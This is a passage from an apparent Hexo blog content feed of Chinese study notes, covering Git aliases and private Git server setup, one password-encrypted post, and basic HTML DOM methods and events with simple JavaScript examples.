alias.ci commit<br>git config –global alias.br branch<br>git config –global alias.unstage ‘reset HEAD’命令git reset HEAD file可以把暂存区的修改撤销掉（unstage），重新放回工作区配置一个unstage别名<br>git unstage test.py此时实际上执行的是git reset HEAD test.py<br>git config –global alias.last ‘log -1’<br>git last 显示最近一次的提交<br>git config –global alias.lg “log –color –graph –pretty=format:’%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset’ –abbrev-commit”<br>git lg 此时可极大提高log的可视化程度<br>配置Git的时候，加上–global是针对当前用户全局变量起作用的，如果不加，那只针对当前的仓库起作用，<br>每个仓库的Git配置文件都放在.git/config文件中<br>当前用户的Git配置文件放在用户主目录下的一个隐藏文件.gitconfig中</p><h2 id="私有仓库搭建"><a href="#私有仓库搭建" class="headerlink" title="私有仓库搭建"></a>私有仓库搭建</h2><p>sudo apt-get install git<br>sudo adduser git<br>收集所有需要登录的用户的公钥，就是他们自己的id_rsa.pub文件，把所有公钥导入到/home/git/.ssh/authorized_keys文件里，一行一个<br>sudo git init –bare sample.git先选定一个目录作为Git仓库，假定是/srv/sample.git，在/srv目录下输入命令<br>此时Git就会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以.git结尾。然后，把owner改为git<br>sudo chown -R git:git sample.git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git:x:1001:1001:,,,:/home/git:/bin/bash出于安全考虑，第二步创建的git用户不允许登录shell，编辑/etc/passwd改为以下</span><br><span class="line">git:x:1001:1001:,,,:/home/git:/usr/bin/git-shell这样git用户可以正常通过ssh使用git，但无法登录shell，因为我们为git用户指定的git-shell每次一登录就自动退出</span><br></pre></td></tr></table></figure><p>git clone git@server:/srv/sample.git可以通过git clone命令克隆远程仓库了</p><h2 id="公钥与权限管理"><a href="#公钥与权限管理" class="headerlink" title="公钥与权限管理"></a>公钥与权限管理</h2><p>如果团队很小，把每个人的公钥收集起来放到服务器的/home/git/.ssh/authorized_keys文件里就是可行的。如果团队有几百号人，就没法这么玩了，这时，可以用Gitosis来管理公钥<br>有很多不但视源代码如生命，而且视员工为窃贼的公司，会在版本控制系统里设置一套完善的权限控制，每个人是否有读写权限会精确到每个分支甚至每个目录下。因为Git是为Linux源代码托管而开发的，所以Git也继承了开源社区的精神，不支持权限控制。不过，因为Git支持钩子（hook），所以，可以在服务器端编写一系列脚本来控制提交等操作，达到权限控制的目的。Gitolite就是这个工具。</p><h2 id="GUI管理git——SourceTree"><a href="#GUI管理git——SourceTree" class="headerlink" title="GUI管理git——SourceTree"></a>GUI管理git——SourceTree</h2><p>免费，可以操作任何git库，官网下载<a href="https://www.sourcetreeapp.com/">https://www.sourcetreeapp.com/</a><br>也可以用idea</p><h2 id="进阶资料"><a href="#进阶资料" class="headerlink" title="进阶资料"></a>进阶资料</h2><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600/897013573512192">https://www.liaoxuefeng.com/wiki/896043488029600/897013573512192</a><br>Git官网：<a href="http://git-scm.com/">http://git-scm.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>灵光乍现</title>
      <link href="2023/03/30/%E5%A4%A9%E9%A9%AC%E8%A1%8C%E7%A9%BA/%E7%81%B5%E5%85%89%E4%B9%8D%E7%8E%B0/"/>
      <url>2023/03/30/%E5%A4%A9%E9%A9%AC%E8%A1%8C%E7%A9%BA/%E7%81%B5%E5%85%89%E4%B9%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f80bc10d040dff5b49a21b5b1836a73637e736793471b11b8e26c374227b0233">c05db5c9326e1a204d18d71a654b071f4a0c98ddba835983d83af0dfc14cfdcc3b3bc16abdf1932525c9fe47980a24ed0d9dc0ec3379d2659a6f230f2a4b107bbbf207c1f254b6036adc960eb22d468fb705a5e520c1818bd6af346661e3a29f38d27a105efb39b9cfdf7a389a988479e5d468272ac84c763e9fa13891e0e3b7d64a80abfd1896bb5fe40b31cd20168cf61df297d2d595022ccd6d039e6184c0de6fd4a16644c5fbc1c43d9ab25b66a0f230d7a5e0b5d38e13d34e5c7435cd714cd8cf980252807473e09944828c38a8caac467e5f722f737064ebd88ef85b76593367eda02f33b025e97914f852914b1321d87b4f5c0fbc7ecac2504012578cbb524303cca2e90a7e63cffa83f40148ce581ef74d154e280d4614685ffad6c2b451ba2922414978ac5042ec6040f4499a14ca1f1706d17e9f1d8aaee765495fe152c2d463055a0e1c22910bfa464cc3bdc6b602869492af8759d4a21c6fe2513f28541c64dddaba4c4dcad553c9fff5d80b89cf8100675d8c75aaf138e89f8c1c2adef8ed9d5a5570bc6dd4a5f16f0f5a37a542167c750eb60a1014ba2159e6c243e490faa3d256be1071038191e5dd6af09871c673ced096ee5b428696935592d9f8604235bce051bf5f9042089c63d697b882f8c334cf8e63699b5d39d5429fdb997c75ba8acf9e7944f8ad3cb639c92763a06f046314dd5fac78a33e7359c5a675aeac62ed67316f6bb65c0ee08fdb928ac5c0e92504ac3877f4ccca5098f6d16b9fe20683b02963caa7eacb0bc4bd433f0e72a3fa82a1ebe4e6622fc7ef7fbfbcf2f7321c7375aa48e0e77ad17f377a18764134abe8b5a436070cf19985260178af7e72764f03d71a86396055791a96c4e0fb0f7c3f369699862b957a903cf9b22b7f7d336fc32737f6f93f80f9505fd1ccacaea126d19c8d2f3aa3f1dad4aee959a98f832c50660209164abea34f2c9235019e271289780426474f99414f5d41928c45dde7a1c135a673fb15a60856baed683db3f5671ec6154ce245bd09518f6a70dfe59ef026d1fea668cef5cc09f8bf0b5fc3c11aa5cc1a096a3b962aeb89cc187ee9dca16d65792c42cfaa82d1af1b700dc0559e2ed4f05df95f8f3bfd1b0363f52a9acd2dade295d30516ee8fc1510d53bb6cf0859ee187ec61c0a80fae2cc21592ab59e0f9e113d01eb3f03d10fc6b7349a561beed667b029f90792fcadc89b650e1baad34e37d2ee93514d92f6d0b3f3ba0522feda1caa543a696c4daa0aadbe4e81dba6f445838e3f8f684a7322a53e6a11418faac7dbaeadb1a49c3b62d34121a251586a5594fd6db6e1b373c23efe4a4fc7eb81b2f13ead789be8f066aa5ebd3150da5ee10bc03a36e200c0c5f5194f60d11ab37536df0238a10b16fcb381fff41b11e63aacc307ffb35146468cbe6867f0e6da07ac8dbd11406f6b912c43280dbf1e297d6de26b971894c71c27f7d8dae30e2e1eb304610c771bcd82f1f3de87b4aca191753d585e26f9fa788d8bdadffaadd9d6d8df82aa15551a9d2d773436833319c080663a6685315878b05458582b7eca5f8b8a88f7c304335ee789bdc62c2c52d0e6a4d8ec5e2047a19f0d1a4bb39418042f88091b8dae664056bbb677b0057a46c3f74fbc4478824e776aac8eabe81b9cd894a3607744b6b4a388b97007757a5a1123c037dc7eea66292b9500f0f17b5295de5b7f7d7676ec775f04583885351415f9d21f6ad3581396fd3a79e4ce0edff9a69f00bfc0e9cf8b6be1b6c021520fa41aa5e72f97a0a97eeb5c26147b963c4964c6ad6f8e0317a4a11044535b8d800ba5cf099148c715f0d9874dccc023193145183dd8458bcf6ca3486014116a5a9079190e6f29b4ebce3e20dd13860529fdd2301111cb02cfdf1453d3ddd81a1461417904033c75b2c53164a4ffed5a2aad8b921fdcbf3be7a73cebd1f7c8cad368bfa784272d3d49caf61157cc90fca6f5ae63f25dc4feb738dc0d5ba905273e54befed0982f721852fbd261561f98b1c56d366dd5d1a5a9d76a1ab377aab5eebc2031dba3f9fdba5800f57cb0475651f5e58573015abf0f6f3dafab6dac88e82215963d7b53f3659317fd764c8fe2fab3e20a58da06b9fd728a60b354eb179cdb3ba46f13fa8a812fefd91087967e5da1ab1b61524cc708f42df78294ba5e95d35ef3de8d897644dfe297cba8ac907cb4db3638badb7fdf4026fc5b9b684cf1dd0397cadfbff910fc44d75a7a7e832344cc2accfc8afcdfb89a6d786c96625201b5b94bdf457f303a4bd5f7aa89e71e450f17ea857e3ad4d015066ec7650961695a5032e2a88f04aeb4e90f869fb25979becb062213c1fd5906330f01a07cbdbca6a29d5ccacd21e5beae05fcf3dcf6ea9fc0713b259410c552b8f15945f45d7979e95bb1a6dfa8bd66ff86e8c124269feb379e5a09e8c49183891ac5f5df1a4d2b48894fb0d4e3a4ab3f02c09dce67980de7bed081c7c0f02deebd24f168296c838275aa1b6ff726cfc2238780cd5c593556571c1687f34eb6fd4bd81afbdcc7e08f4f1e66ee6cfbed51a01cb7a61e6a8fea2afe2c823479acc0d57200f70a9609cf67b238223b1aec4e2e2372592218957a6857f76e1606e4508bcd02107de3c73254c9b846ca1ddd65d3292ec161cdcefc838327d11ab4dd4111597b79cb76ac1b25bff069244672c83e953ad2836ab229fcab4aeafb211da509ccd2eb4a054a84f02390c5b8b609be93051f0ae9fb4eff6d7a30501deef34f3aa5755493c353accf1b9857db3e88c2462047aac2dbc313aa5a68fc72f033abd24a7db56ae2416272c8de62ccede7aba2022bd17dc35fc94454bb32d7a4e930843adcd6384d3f89719c7a4b92d7a500acd6f6373993a5faf55f58a983243ffcfb7939b5c038e46cb7683d73147332511ef5081e490c473697f2a0213f673a7c9d088a811d16017bb4eedc46b5bf0fb9ef5fcf83cb555736719457d8265a8657acfa8932c9c1180c12bc4e08d6d40cc7f6033a9172a862f94645e6edba6afaeeb533e35926e8ab2eca4c0dd8907aab9b3e51ac15080e3846b069e6a985bf75b236a8d74909c6645c7abfb22ccae01f59f6e0945d128f76adeb7c0d30899a796466c9a28093867fc88fa10630a41000ddb30719f9ba1850d7021f93bb2ea23a7636c3391ce6f15c75384c5f7408ebdce9eeecf320770276d07280d803f980bcfa3ccf50a523dc641fe09cdf338e6310ed36bff86cdaa5d5a9649c623b13c5737bad75abfc49c4054b55e0bbfd18427d7f0a5839155c5f39cf0a30d8e20a4042bb003e9b9a789783dfc581105470fa6aa58feed10868e82f77aef1df0835443b58bd00929c9f8111dc57d906e5884b236e10f6c1592a84ab41e24ad750e7681c4669bd82be5b0b1451a0a425d4d6ee8290654a4b45bd62a6cfefe331bcfa989ea14dc5346430d62f94b2ec315049599e6ad4cce32209d9f1c77c24b521a99cc93f9d7237f2b5a1870b6db25aa2d52105e62d5a65cb697bfff2d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 天马行空 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 灵感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML DOM笔记</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/DOM%E6%96%87%E6%9C%AC%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/DOM%E6%96%87%E6%9C%AC%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="DOM是什么"><a href="#DOM是什么" class="headerlink" title="DOM是什么"></a>DOM是什么</h2><ul><li><p>DOM (Document Object Model) <strong>文档对象模型</strong>，是 HTML 和 XML 文档的编程接口。</p></li><li><p>HTML DOM 定义了访问和操作 HTML 文档的标准方法，是 W3C（万维网联盟）的标准。</p></li><li><p>DOM 以树结构表达 HTML 文档。</p></li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210731170900484.png" alt="image-20210731170900484"></p><blockquote><p>“W3C 文档对象模型 （DOM） 是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式。”</p></blockquote><p>W3C DOM 标准被分为 3 个不同的部分：</p><ul><li>核心 DOM - 针对任何结构化文档的标准模型</li><li>XML DOM - 针对 XML 文档的标准模型</li><li>HTML DOM - 针对 HTML 文档的标准模型</li></ul><h2 id="HTML-DOM"><a href="#HTML-DOM" class="headerlink" title="HTML DOM"></a>HTML DOM</h2><ul><li><p>HTML DOM 定义了所有 HTML 元素的<em>对象</em>和<em>属性</em>，以及访问它们的<em>方法</em>。</p></li><li><p>HTML DOM 是关于如何获取、修改、添加或删除 HTML 元素的标准。</p></li></ul><h2 id="HTML-DOM节点"><a href="#HTML-DOM节点" class="headerlink" title="HTML DOM节点"></a>HTML DOM节点</h2><ul><li><p>在 HTML DOM 中，所有事物都是节点。DOM 是被视为节点树的 HTML。</p></li><li><ul><li>整个文档是一个文档节点</li><li>每个 HTML 元素是元素节点</li><li>HTML 元素内的文本是文本节点</li><li>每个 HTML 属性是属性节点</li><li>注释是注释节点</li></ul></li></ul><h3 id="parent，child，sibling（兄弟），三种节点"><a href="#parent，child，sibling（兄弟），三种节点" class="headerlink" title="parent，child，sibling（兄弟），三种节点"></a>parent，child，sibling（兄弟），三种节点</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210731171635652.png" alt="image-20210731171635652"></p><h2 id="HTML-DOM方法-amp-属性"><a href="#HTML-DOM方法-amp-属性" class="headerlink" title="HTML DOM方法 &amp; 属性"></a>HTML DOM方法 &amp; 属性</h2><ul><li><p>方法是可以在节点（HTML 元素）上执行的动作（比如添加或修改元素）。</p></li><li><p>可通过 JavaScript （以及其他编程语言）对 HTML DOM 进行访问。</p></li><li><p>所有 HTML 元素被定义为对象，而编程接口则是对象方法和对象属性。</p></li></ul><hr><h3 id="一些常用的-HTML-DOM-方法："><a href="#一些常用的-HTML-DOM-方法：" class="headerlink" title="一些常用的 HTML DOM 方法："></a>一些常用的 HTML DOM 方法：</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>getElementById()</td><td>返回带有指定 ID 的元素。</td></tr><tr><td>getElementsByTagName()</td><td>返回包含带有指定标签名称的所有元素的节点列表（集合/节点数组）。</td></tr><tr><td>getElementsByClassName()</td><td>返回包含带有指定类名的所有元素的节点列表。</td></tr><tr><td>appendChild()</td><td>把新的子节点添加到指定节点。</td></tr><tr><td>removeChild()</td><td>删除子节点。</td></tr><tr><td>replaceChild()</td><td>替换子节点。</td></tr><tr><td>insertBefore()</td><td>在指定的子节点前面插入新的子节点。</td></tr><tr><td>createAttribute()</td><td>创建属性节点。</td></tr><tr><td>createElement()</td><td>创建元素节点。</td></tr><tr><td>createTextNode()</td><td>创建文本节点。</td></tr><tr><td>getAttribute()</td><td>返回指定的属性值。</td></tr><tr><td>setAttribute()</td><td>把指定属性设置或修改为指定的值。</td></tr></tbody></table><hr><p><strong>HTML DOM 属性是我们可以在节点（HTML 元素）设置和修改的值（比如节点的名称或内容）。</strong></p><ul><li>为HTML元素提供各种附加信息的就是HTML属性，它总是以”属性名=属性值”这种名值对的形式出现，而且属性总是在HTML元素的开始标签中进行定义。</li></ul><h3 id="一些常用的-HTML-DOM-属性："><a href="#一些常用的-HTML-DOM-属性：" class="headerlink" title="一些常用的 HTML DOM 属性："></a>一些常用的 HTML DOM 属性：</h3><ul><li>innerHTML - 节点（元素）的文本值</li><li>parentNode - 节点（元素）的父节点</li><li>childNodes - 节点（元素）的子节点</li><li>attributes - 节点（元素）的属性节点</li></ul><h3 id="nodeName-属性"><a href="#nodeName-属性" class="headerlink" title="nodeName 属性"></a>nodeName 属性</h3><p>nodeName 属性规定节点的名称。</p><ul><li>nodeName 是只读的</li><li>元素节点的 nodeName 与标签名相同</li><li>属性节点的 nodeName 与属性名相同</li><li>文本节点的 nodeName 始终是 #text</li><li>文档节点的 nodeName 始终是 #document</li></ul><p><strong>注意：</strong> nodeName 始终包含 HTML 元素的大写字母标签名。</p><h3 id="nodeValue-属性"><a href="#nodeValue-属性" class="headerlink" title="nodeValue 属性"></a>nodeValue 属性</h3><p>nodeValue 属性规定节点的值。</p><ul><li>元素节点的 nodeValue 是 undefined 或 null</li><li>文本节点的 nodeValue 是文本本身</li><li>属性节点的 nodeValue 是属性值</li></ul><h3 id="nodeType-属性"><a href="#nodeType-属性" class="headerlink" title="nodeType 属性"></a>nodeType 属性</h3><p>nodeType 属性返回节点的类型。nodeType 是只读的。</p><p>比较重要的节点类型有：</p><table><thead><tr><th>元素类型</th><th>NodeType</th></tr></thead><tbody><tr><td>元素</td><td>1</td></tr><tr><td>属性</td><td>2</td></tr><tr><td>文本</td><td>3</td></tr><tr><td>注释</td><td>8</td></tr><tr><td>文档</td><td>9</td></tr></tbody></table><h2 id="HTML-DOM-访问"><a href="#HTML-DOM-访问" class="headerlink" title="HTML DOM 访问"></a>HTML DOM 访问</h2><ul><li>访问 HTML DOM - 查找 HTML 元素=访问节点。</li><li>访问 HTML 元素的方式：<ul><li>通过使用 getElementById() 方法</li><li>通过使用 getElementsByTagName() 方法</li><li>通过使用 getElementsByClassName() 方法</li></ul></li></ul><h2 id="HTML-DOM-修改"><a href="#HTML-DOM-修改" class="headerlink" title="HTML DOM 修改"></a>HTML DOM 修改</h2><ul><li>修改 HTML = 改变元素、属性、样式和事件。</li><li>具体来说，修改 HTML DOM 意味着许多不同的方面：<ul><li>改变 HTML 内容</li><li>改变 CSS 样式</li><li>改变 HTML 属性</li><li>创建新的 HTML 元素</li><li>删除已有的 HTML 元素</li><li>改变事件（处理程序）</li></ul></li></ul><hr><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//创建HTML内容：</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;p1&quot;</span>).innerHTML=<span class="string">&quot;新文本!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//改变HTML样式</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;p2&quot;</span>).style.color=<span class="string">&quot;blue&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;p2&quot;</span>).style.fontFamily=<span class="string">&quot;Arial&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;p2&quot;</span>).style.fontSize=<span class="string">&quot;larger&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建新的HTML元素</span></span><br><span class="line"><span class="comment">//如需向 HTML DOM 添加新元素，首先必须创建该元素（元素节点），然后把它追加到已有的元素上。</span></span><br><span class="line"><span class="keyword">var</span> para=<span class="built_in">document</span>.createElement(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> node=<span class="built_in">document</span>.createTextNode(<span class="string">&quot;这是一个新段落。&quot;</span>);</span><br><span class="line">para.appendChild(node);</span><br><span class="line"><span class="keyword">var</span> element=<span class="built_in">document</span>.getElementById(<span class="string">&quot;div1&quot;</span>);</span><br><span class="line">element.appendChild(para);</span><br><span class="line"></span><br><span class="line"><span class="comment">//改变HTML内容</span></span><br><span class="line"><span class="comment">//改变元素内容的最简单的方法是使用 innerHTML 属性。</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;p1&quot;</span>).innerHTML=<span class="string">&quot;新文本!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//改变HTML样式</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;p2&quot;</span>).style.color=<span class="string">&quot;blue&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;p2&quot;</span>).style.fontFamily=<span class="string">&quot;Arial&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;p2&quot;</span>).style.fontSize=<span class="string">&quot;larger&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用事件</span></span><br><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span></span><br><span class="line">onclick=<span class="string">&quot;document.body.style.backgroundColor=&#x27;lavender&#x27;;&quot;</span></span><br><span class="line">value=<span class="string">&quot;修改背景颜色&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HTML-DOM-元素"><a href="#HTML-DOM-元素" class="headerlink" title="HTML DOM 元素"></a>HTML DOM 元素</h2><ul><li>HTML网页实际上就是由许许多多各种各样的HTML元素构成的文本文件，并且任何网页浏览器都可以直接运行HTML文件。所以可以这样说，HTML元素就是构成HTML文件的基本对象，HTML元素可以说是一个统称而已。HTML元素就是通过使用HTML标签进行定义的。 </li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建新的HTML元素</span></span><br><span class="line"><span class="comment">//向 HTML DOM 添加新元素，先必须创建该元素，然后把它追加到已有的元素上。</span></span><br><span class="line"><span class="comment">//使用createElement()</span></span><br><span class="line"><span class="keyword">var</span> para=<span class="built_in">document</span>.createElement(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> node=<span class="built_in">document</span>.createTextNode(<span class="string">&quot;这是一个新段落。&quot;</span>);</span><br><span class="line">para.appendChild(node);</span><br><span class="line"><span class="keyword">var</span> element=<span class="built_in">document</span>.getElementById(<span class="string">&quot;div1&quot;</span>);</span><br><span class="line">element.appendChild(para);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用insertBefore()</span></span><br><span class="line"><span class="comment">//appendChild() 方法，将新元素作为父元素的最后一个子元素进行添加。不想这样的话可以使用 insertBefore() 方法：</span></span><br><span class="line"><span class="keyword">var</span> para=<span class="built_in">document</span>.createElement(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> node=<span class="built_in">document</span>.createTextNode(<span class="string">&quot;这是一个新段落。&quot;</span>);</span><br><span class="line">para.appendChild(node);</span><br><span class="line"><span class="keyword">var</span> element=<span class="built_in">document</span>.getElementById(<span class="string">&quot;div1&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> child=<span class="built_in">document</span>.getElementById(<span class="string">&quot;p1&quot;</span>);</span><br><span class="line">element.insertBefore(para,child);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//删除已有HTML元素</span></span><br><span class="line"><span class="keyword">var</span> parent=<span class="built_in">document</span>.getElementById(<span class="string">&quot;div1&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> child=<span class="built_in">document</span>.getElementById(<span class="string">&quot;p1&quot;</span>);</span><br><span class="line">parent.removeChild(child);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换HTML元素</span></span><br><span class="line"><span class="keyword">var</span> parent=<span class="built_in">document</span>.getElementById(<span class="string">&quot;div1&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> child=<span class="built_in">document</span>.getElementById(<span class="string">&quot;p1&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> para=<span class="built_in">document</span>.createElement(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> node=<span class="built_in">document</span>.createTextNode(<span class="string">&quot;这是一个新的段落。&quot;</span>);</span><br><span class="line">para.appendChild(node);</span><br><span class="line">parent.replaceChild(para,child);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HTML-DOM-事件"><a href="#HTML-DOM-事件" class="headerlink" title="HTML DOM 事件"></a>HTML DOM 事件</h2><ul><li>HTML DOM 允许 JavaScript 对 HTML 事件作出反应，即，当事件发生时，可以执行 JavaScript</li><li>HTML 事件的例子：<ul><li>当用户点击鼠标时</li><li>当网页已加载时</li><li>当图片已加载时</li><li>当鼠标移动到元素上时</li><li>当输入字段被改变时</li><li>当 HTML 表单被提交时</li><li>当用户触发按键时</li></ul></li></ul><hr><p><strong>向 HTML 元素分配事件，可以使用事件属性</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 onclick=<span class="string">&quot;this.innerHTML=&#x27;Ooops!&#x27;&quot;</span>&gt;点击文本!&lt;/h1&gt;</span><br></pre></td></tr></table></figure><hr><p><strong>HTML DOM 允许使用js向 HTML 元素分配事件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;myBtn&quot;</span>).onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;displayDate()&#125;;</span><br></pre></td></tr></table></figure><p>名为 displayDate 的函数被分配给了 id=myButn” 的 HTML 元素。当按钮被点击时，将执行函数。</p><hr><h3 id="onload-amp-onunload-事件"><a href="#onload-amp-onunload-事件" class="headerlink" title="onload &amp; onunload 事件"></a>onload &amp; onunload 事件</h3><ul><li><p>当用户进入或离开页面时，会触发 onload 和 onunload 事件。</p></li><li><p>onload 事件可用于检查访客的浏览器类型和版本，以便基于这些信息来加载不同版本的网页。</p></li><li><p>onload 和 onunload 事件可用于处理 cookies。</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;checkCookies()&quot;</span>&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="onchange-事件"><a href="#onchange-事件" class="headerlink" title="onchange 事件"></a>onchange 事件</h3><ul><li>onchange 事件常用于输入字段的验证。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;fname&quot;</span> onchange=<span class="string">&quot;upperCase()&quot;</span>&gt;</span><br><span class="line">    <span class="comment">//当用户改变输入字段的内容时，将调用 upperCase() 函数。</span></span><br></pre></td></tr></table></figure><hr><h3 id="onmouseover-和-onmouseout-事件"><a href="#onmouseover-和-onmouseout-事件" class="headerlink" title="onmouseover 和 onmouseout 事件"></a>onmouseover 和 onmouseout 事件</h3><ul><li>用于在鼠标指针移动到或离开元素时触发函数。</li></ul><hr><h3 id="onmousedown、onmouseup-以及-onclick-事件"><a href="#onmousedown、onmouseup-以及-onclick-事件" class="headerlink" title="onmousedown、onmouseup 以及 onclick 事件"></a>onmousedown、onmouseup 以及 onclick 事件</h3><ul><li>首先当某个鼠标按钮被点击时，触发 onmousedown 事件，</li><li>然后，当鼠标按钮被松开时，会触发 onmouseup 事件，</li><li>最后，当鼠标点击完成时，触发 onclick 事件。</li></ul><hr><h2 id="HTML-DOM-导航"><a href="#HTML-DOM-导航" class="headerlink" title="HTML DOM 导航"></a>HTML DOM 导航</h2><ul><li><p>通过 HTML DOM，能够使用节点关系在节点树中导航。</p></li><li><p>getElementsByTagName() 方法返回<em>节点列表</em>。节点列表是一个节点数组。</p></li><li><p>length 属性获得节点列表长度</p></li><li><p>使用三个节点属性：parentNode、firstChild 以及 lastChild ，在文档结构中进行导航。</p></li><li><p>两个特殊的属性，可以访问全部文档：</p><ul><li>document.documentElement - 全部文档</li><li>document.body - 文档的主体</li></ul></li><li><p>除了 innerHTML 属性，也可以使用 childNodes 和 nodeValue 属性来获取元素的内容。</p></li></ul><blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DOM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神奇的函数们</title>
      <link href="2023/03/30/Math%20Weapon/%E7%A5%9E%E5%A5%87%E7%9A%84%E5%87%BD%E6%95%B0%E4%BB%AC/"/>
      <url>2023/03/30/Math%20Weapon/%E7%A5%9E%E5%A5%87%E7%9A%84%E5%87%BD%E6%95%B0%E4%BB%AC/</url>
      
